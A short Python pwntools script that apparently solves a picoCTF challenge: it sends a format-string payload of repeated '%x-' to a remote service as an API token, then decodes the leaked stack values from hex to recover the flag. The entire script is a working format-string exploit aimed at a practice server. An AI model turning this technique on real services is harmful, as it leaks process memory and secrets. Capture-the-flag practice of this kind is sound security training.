#!/bin/python3
import pwn
r = pwn.remote('mercury.picoctf.net', '16439')
r.recvuntil("View my portfolio")
r.sendline('1')
pwn.log.info("Viewing Portfolio...")
r.recvuntil("What is your API token?")
pwn.log.info("Sending String Formats...")
r.sendline('%x-' * 50)
pwn.log.info("Received Data... Parsing API Key..")
r.recvuntil("Buying stonks with token:\n")
leak = r.recvline().decode("utf-8")
leak = leak.split('-')

flag = ""

for data in leak:
    try:
        # Try to print if its decodable from hex to ascii
        data = bytearray.fromhex(data).decode()[::-1]
        flag += data
    except:
        continue

print(flag)
